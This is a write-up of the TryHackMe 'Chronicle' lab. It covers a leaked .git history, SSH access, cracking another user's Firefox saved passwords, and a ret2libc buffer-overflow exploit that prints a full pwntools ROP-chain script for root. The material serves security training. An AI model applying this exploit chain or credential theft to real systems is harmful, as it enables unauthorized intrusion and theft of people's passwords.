# Chronicle — TryHackMe Writeup

> **TL;DR:** Exposed `.git` directory leaked an API key → credentials
> retrieved → SSH access → Firefox credentials cracked → SUID binary
> exploited via ret2libc → root shell

---

## Introduction
Chronicle is a medium-difficulty TryHackMe room that chains together
web enumeration, credential discovery, and binary exploitation to
achieve root. What makes this room interesting is that each step
naturally flows into the next — nothing feels forced.

---

## Staring With Recon
Starting with a port scan revealed two web services running side by side ( **Port 80 and 8081** ) in addition to SSH Port

<img width="1186" height="351" alt="image" src="https://github.com/user-attachments/assets/1d12552c-c231-4dcd-b4e0-1695a2f86803" />

- **Port 80** — visiting it showed nothing but the word "OLD", 
clearly an outdated site left running

- **Port 8081** — a newer looking site, nothing particularly 
interesting except one feature that caught my eye: a password 
retrieval function in the *forget password* page that only required a username but it didn't seem to work.
<img width="888" height="275" alt="image" src="https://github.com/user-attachments/assets/061cd505-e09e-4107-b397-9f8b0544c7b0" />

## Digging Deeper

With nothing obvious on the surface, I dug into the JavaScript 
files on port 8081. Inside `forgot.js` I found something interesting:

```javascript
xhttp.send('{"key":"NULL"}') //Removed the API Key to stop the forget password functionality
```

The developer had removed the API key from the source code but left 
a very telling comment behind — *"Removed the API Key to stop the 
forget password functionality"*. 

This told me two things:
1. The API key existed at some point
2. It was intentionally removed — likely from a git commit

Which can be proven by checking the forget password page source:
<img width="920" height="434" alt="image" src="https://github.com/user-attachments/assets/17581eb0-f6f6-4ac0-acdb-47ce6666fa27" />


# Found: .git
\```

A `.git` directory exposed on a web server means one thing —
the entire commit history is accessible.

---

## Credential Discovery
Enumerating the git history:
\```bash
git log        # list all commits
git show <id>  # inspect suspicious commit
\```

One commit contained a hardcoded API key that was later removed —
but git never forgets. Armed with the API key and a username,
the retrieval endpoint returned valid credentials.

---

## Initial Access — tommy
With credentials in hand, SSH gave us a foothold:
\```bash
ssh tommy@<ip>
cat user.txt  # first flag!
\```

---

## Lateral Movement — carlJ
Enumerating the system revealed another user, **carlJ**, with
a `.mozilla` folder — Firefox profiles store saved passwords
in encrypted form, but they can be decrypted offline.

Transferred the profile to my local machine:
\```bash
scp -r tommy@<ip>:/home/carlJ/.mozilla/firefox ./firefox
\```

Used `firefox_decrypt` but it required a master password.
Rather than guess manually, I automated it with a Python script
that tried each password from rockyou.txt until it succeeded.

Found carlJ's password and SSHed in.

---

## Privilege Escalation — ret2libc Buffer Overflow
Inside carlJ's home directory was a `mailing/` folder containing
a SUID binary called `smail`. Running it showed two options —
Send Message and Change Signature.

The word "signature" with no visible limit is a red flag for
buffer overflow.

### Binary Analysis
\```bash
checksec --file=./smail
\```
\```
NX:    enabled   → shellcode won't work, need ret2libc
PIE:   disabled  → gadget addresses are static
Stack: no canary → can overflow freely
\```

### Finding the Offset
The buffer was **64 bytes** + **8 bytes** for RBP = **72 bytes**
before we control the return address.

### Building the ROP Chain
Since NX is enabled we can't run shellcode. Instead we:
1. Return into `system()` from libc
2. Pass `/bin/sh` as the argument via the `pop rdi` gadget

\```
[72 x 'A'][ret gadget][pop rdi][/bin/sh address][system()]
     |           |          |           |              |
  overflow   alignment   set RDI    argument       shell!
\```

The `ret` gadget is needed for 16-byte stack alignment —
without it `system()` crashes on a `movaps` instruction.

### Exploit
\```python
from pwn import *

p = process('./smail')

libc_base = 0x7ffff79e2000
system    = libc_base + 0x4f550
binsh     = libc_base + 0x1b3e1a
POP_RDI   = 0x4007f3
RET       = 0x400556

payload  = b'A' * 72
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'What do you wanna do', b'2')
p.sendlineafter(b'Write your signature...', payload)
p.interactive()
\```

---

## Conclusion
Chronicle was a great room for chaining multiple techniques together.
The key takeaways:
- Always fuzz for `.git` directories on web servers
- Firefox profiles are goldmines for credentials
- SUID binaries with unchecked input are privesc gold

## What I Learned
- `git log` for commit history enumeration
- `scp` for file transfers
- Firefox credential decryption
- ret2libc buffer overflow exploitation
- ROP chains and stack alignment in 64-bit
